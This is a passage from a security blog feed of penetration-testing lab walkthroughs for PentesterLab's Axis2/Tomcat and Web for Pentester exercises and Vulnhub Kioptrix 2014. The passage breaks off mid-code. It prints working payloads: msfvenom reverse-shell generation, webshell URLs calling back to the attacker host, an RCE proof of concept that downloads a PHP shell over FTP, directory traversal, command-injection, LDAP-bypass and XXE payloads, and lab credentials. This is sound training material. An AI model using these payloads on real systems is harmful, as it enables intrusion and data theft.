    <content type="html"><![CDATA[<p>&ldquo;This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users' file to access the Tomcat Manager and gain commands execution on the server.&rdquo; &ndash; <font color="green"><em>PentesterLab</em></font></p>

<p>More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 3 / 5</p>

<!-- more -->


<h2>Walkthrough</h2>

<p>Based on the result of NMAP scan, tcp port 80 is open.</p>

<p>Access tcp port 80 and use DirBuster/wfuzz to brute force hidden path and found &ldquo;/axis2&rdquo;:</p>

<p>wfuzz command to burte force hidden path:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://10.10.10.129/FUZZ 2>/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/1.png"></p>

<p>Due to axis2&rsquo;s ProxyService has information retrieving vulnerability, exploit it and find users' passwords information.</p>

<p>Here are two methods to upload webshell.</p>

<h3>Method 1</h3>

<p>Retrieving Tomcat manager configuration to get login credentials.</p>

<p>In Debian Linux, the tomcat configuration file <code>tomcat-users.xml</code> has default location: <font color="red"><em>/etc/tomcat6/tomcat-users.xml</em></font></p>

<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/2.png"></p>

<p>From <code>tomcat-users.xml</code> file, the tomcat manager-gui login password can be found: <font color="red"><em>manager / !mp0ss!bl32gu355</em></font></p>

<p>Then login tomcat manager from the URL <code>http://10.10.10.129/manager/html</code> to upload and deploy JSP webshell in WAR file.</p>

<p>Use msfvenom to generate JSP reverse shell and build the war file using <code>jar</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir webshell
</span><span class='line'>$ cd webshell
</span><span class='line'>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.131 LPORT=4444 -f raw > sh4.jsp
</span><span class='line'>$ jar -cvf ../webshell.jar *</span></code></pre></td></tr></table></div></figure>


<p>Use the following URL to trigger reverse shell connect back to my Kali on port 4444:</p>

<p><code>http://10.10.10.129/webshell/sh4.jsp</code></p>

<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/3.png"></p>

<h3>Method 2</h3>

<p>Retrieving Axis2 configuration to get login credentials.</p>

<p>In Debian Linux, the axis2 configuration file <code>axis2.xml</code> has default location: <font color="red"><em>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</em></font></p>

<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/4.png"></p>

<p>From <code>axis2.xml</code> file, the axis2 admin login password can be found: <font color="red">admin / axis2</font></p>

<p>Then login axis2 admin page from the URL <code>http://10.10.10.129/axis2/axis2-admin/</code> to upload and deploy axis2 webshell in AAR file.</p>

<p>Here I use <code>Cat.aar</code> <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">axis2 webshell</a>, upload and deploy it as axis2 service.</p>

<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/5.png"></p>

<p>Then use the following URL to trigger reverse shell connect back to my Kali on port 5555:</p>

<p><code>http://10.10.10.129/axis2/services/Cat/shell?host=10.10.10.131&amp;port=5555</code></p>

<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/6.png"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] Kioptrix 2014]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/25/vulnhub-kioptrix-2014/"/>
    <updated>2015-05-25T00:54:33-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/25/vulnhub-kioptrix-2014</id>
    <content type="html"><![CDATA[<p>This is probably the last/final version of Kioptrix challenge VM, after played with all of those well designed vulnerable boxes, I would say they are challenging and enjoyable, not only for juniors like me :) but also the Pen tester pros will make fun from them. Cheers to <strong><em>loneferret</em></strong> and <strong><em>haken29a</em></strong>.</p>

<p>So back to Kioptrix 2014, more details can be found in this vulnhub website <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">link</a>, which including VM download links, walkthroughs, bug fixes (highly recommended to read Description when first running the VM) and blah blah blah &hellip;</p>

<h2>Links</h2>

<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/128762761?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Kioptrix 2014 (<em>10.10.10.132/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><a href="https://www.exploit-db.com/exploits/21665/">phptax 0.8 - Remote Code Execution Vulnerability</a></li>
<li><a href="https://www.exploit-db.com/exploits/31173/">pChart2.1.3 Directory Traversal Vulnerability</a></li>
<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering and interacting with the web server [firefox, wappalyzer addon]</li>
<li>Exploit Remote Code Execution and upload reverse php webshell [php-reverse-shell]</li>
<li>Exploit local privilege escalation to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>I use netdiscover as routine to detect the target&rsquo;s IP address and then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 80 and 8080 have been discovered and the web server is <font color="red">apache 2.2.21</font> running on <font color="red">FreeBSD system</font>.</p>

<p>Fire up NIKTO for web scanning but did not get much interesting results. Trying to access port 8080 from my FIREFOX browser but the access has been forbidden. So I turn to access port 80 on firefox. This time, it shows classic &ldquo;It works!&rdquo; page. After checking the source code, I found something interesting(hidden URL) in comments:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--  &lt;META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">  --></span></code></pre></td></tr></table></div></figure>


<p>Looks like web application &ldquo;pChart version 2.1.3&rdquo; is running, so I searched &ldquo;pChart2.1.3 exploit&rdquo; in google and found &ldquo;<a href="https://www.exploit-db.com/exploits/31173/">Directory Traversal and Reflected XSS Vulnerability</a>&rdquo;.</p>

<p>By exploiting the &ldquo;Directory Traversal&rdquo; vulnerability, I can read some system files, such as <code>/etc/passwd</code> and apache configuration file <code>/usr/local/etc/apache22/httpd.conf</code> (note: this is <a href="https://www.freebsd.org/doc/handbook/network-apache.html">apache configuration file location in FreeBSD</a>, which is different from other Linux systems)</p>

<p>PoC:</p>

<p><code>http://10.10.10.132/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../etc/passwd</code></p>

<p><code>http://10.10.10.132/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../usr/local/etc/apache22/httpd.conf</code></p>

<p>From apache configuration file, I found the following configuration in the end of the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;VirtualHost</span> <span class="err">*:8080</span><span class="nt">&gt;</span>
</span><span class='line'>    DocumentRoot /usr/local/www/apache22/data2
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;Directory</span> <span class="err">&quot;/usr/local/www/apache22/data2&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    Options Indexes FollowSymLinks
</span><span class='line'>    AllowOverride All
</span><span class='line'>    Order allow,deny
</span><span class='line'>    Allow from env=Mozilla4_browser
</span><span class='line'><span class="nt">&lt;/Directory&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is the key to open port 8080, I changed the user-agent header to <code>Mozilla/4.0</code> (anything start with this string should bypass) by using Firefox addons <a href="https://addons.mozilla.org/En-us/firefox/addon/user-agent-switcher/">User Agent Switcher</a>.</p>

<p>After access 8080 again with new User-Agent Header, I found the web application &ldquo;phptax&rdquo; in URL: <code>http://10.10.10.132:8080/phptax/</code>. Then I searched &ldquo;phptax exploit&rdquo; in google and found the <a href="https://www.exploit-db.com/exploits/21665/">Remote Code Execution vulnerability</a>.</p>

<p>Due to this is FreeBSD system (the OSCP studying experences very helpful here :P), the nc reverse shell could not work, so I have to find other ways. I set up <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a> and FTP server on my Kali, then exploit remote code execution vulnerability to upload my php reverse shell (sh.php) to the target.</p>

<p>PoC:</p>

<p><code>http://10.10.10.132:8080/phptax/index.php?pfilez=1040d1-pg2.tob;ftp -4 -d -v ftp://offsec:offsec@10.10.10.131//sh.php;&amp;pdf=make</code></p>

<p>* <font color="red">Note</font>: There are other methods can be used to upload php reverse shell, for example, using NC. Please check other walkthroughs from the vulnhub <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/#walkthrough">link</a></p>

<p>Then I set up NC to listen on port 5555 and access the URL <code>http://10.10.10.132:8080/phptax/sh.php</code> to trigger the reverse shell connect back to my NC.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/kioptrix2014/1.png"></p>

<p>* <font color="red">Note</font>: Metasploit framework also provides an automatic exploit method: &ldquo;<strong><em>exploit/multi/http/phptax_exec</em></strong>&rdquo;</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/kioptrix2014/2.png"></p>

<p>Now, I have already got in with limited privilege. After some local enumeration, I searched &ldquo;freebsd 9 exploit&rdquo; in google and found two working exploits:</p>

<ul>
<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
</ul>


<p>After upload any one of the exploits, compiled with gcc and run it to get ROOT.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/kioptrix2014/3.png"></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/kioptrix2014/4.png"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - FINAL]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/"/>
    <updated>2015-05-23T00:52:14-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this is the last one will focus on several different types of injection: Commands injection, LDAP injection and XML injection. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h1>Commands Injection</h1>

<blockquote><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p><footer><strong>OWASP</strong> <cite><a href='https://www.owasp.org/index.php/Command_Injection'>Command Injection</a></cite></footer></blockquote>


<h2>Example 1</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../footer.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This one is simple and directly exploitable.</p>

<p>From the page we know the command ping $ip is running on server side and return the result to the client. Due to there is no input validation, we can inject payload to construct multi commands in one line with &ldquo;;&rdquo;, &ldquo;|&rdquo; or &ldquo;&amp;&amp;&rdquo;, for example, &ldquo;ping 127.0.0.1; id&rdquo; or &ldquo;ping 127.0.0.1 &amp;&amp; id&rdquo;.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1 %26%26 id</code></p>

<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1; id</code></p>

<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1| id</code></p>

<h2>Example 2</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
</span><span class='line'>     <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Invalid IP address&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../footer.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>From the source code above, we can see that <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">PRCE Modifier &ldquo;m&rdquo;</a> is used in preg_match function. As a result, we can bypass this validation by using newline &ldquo;<em><font color="red">%0a</font></em>&rdquo;.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/commandexec/example2.php?ip=127.0.0.1%0aid</code></p>

<h2>Example 3</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
</span><span class='line'>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: example3.php?ip=127.0.0.1&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../footer.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the <em>preg_match</em> function did a good validation on user&rsquo;s input. However, the script didn&rsquo;t stop when evil character is matched in user&rsquo;s input. Instead of, it only use header function to do a redirection without die function to stop the script.</p>

<p>So the attacking methods (&lsquo;;&rsquo;, &lsquo;&amp;&amp;&rsquo; and &lsquo;|&rsquo;) still works on this one, but it will need a proxy like <strong><em>burpsuite</em></strong> or <strong><em>nc/telnet</em></strong> to read the first response page.</p>

<p>PoC:</p>

<p>Use <strong><em>NC</em></strong> to exploit this vulnerability</p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1;id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1|id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1%26%26id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>

<h1>LDAP Injection</h1>

<blockquote><p>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</p><footer><strong>https://www.owasp.org/index.php/LDAP_injection LDAP Injection</strong></footer></blockquote>


<h2>Example 1</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$ld</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>     <span class="nv">$user</span> <span class="o">=</span> <span class="s2">&quot;uid=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;ou=people,dc=pentesterlab,dc=com&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="p">}</span>
</span><span class='line'>   <span class="nv">$lb</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">]);</span>
</span><span class='line'>   <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Due to the developer use ldap_bind function which will make an anonymous bind if both parameters are not specified, the attacker can bypass the authentication by removing all the parameters from the query.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/ldap/example1.php</code></p>

<h2>Example 2</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>      <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&quot;{MD5}&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">pack</span><span class="p">(</span><span class="s2">&quot;H*&quot;</span><span class="p">,</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])));</span>
</span><span class='line'>  <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&quot;(&amp;(cn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)(userPassword=&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;))&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>After checking the source code, the attacker can bypass the authentication by using the following exploit payload:</p>

<p><code>http://10.10.10.129/ldap/example2.php?name=hacker)(cn=*))%00&amp;password=asdfasdf</code></p>

<p>the variable <em>$filter</em> will become to &ldquo;<font color="red">(&amp;(cn=hacker)(cn=*))%00)(userPassword=[pass]))</font>&rdquo; which <strong><em>%00</em></strong> will get rid of all the following strings.</p>

<p>More information about testing LDAP injection, please check the OWASP article <a href="https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-007)">Testing for LDAP Injection</a></p>

<h1>XML Injection</h1>

<h2>Example 1</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello  </span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;xml&#39;</span><span class="p">]);</span>
</span><span class='line'>  <span class="nb">print_r</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$xml</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../footer.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>XML eXternal Entity (XXE) attack:</p>

<blockquote><p>External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.</p><footer><strong>OWASP</strong> <cite><a href='https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)'>Testing_for_XML_Injection</a></cite></footer></blockquote>


<p>Attacking payload (read system file: /etc/passwd):</p>

<p><code>&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</code></p>

<p>PoC (with URL encoded):</p>

<p><code>http://10.10.10.129/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E</code></p>

<h2>Example 2</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$x</span> <span class="o">=</span> <span class="s2">&quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$x</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$xpath</span> <span class="o">=</span> <span class="s2">&quot;users/user/name[.=&#39;&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;]/parent::*/message&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$res</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$xml</span><span class="o">-&gt;</span><span class="na">xpath</span><span class="p">(</span><span class="nv">$xpath</span><span class="p">));</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="k">list</span><span class="p">(</span> <span class="p">,</span><span class="nv">$node</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span> <span class="nv">$node</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
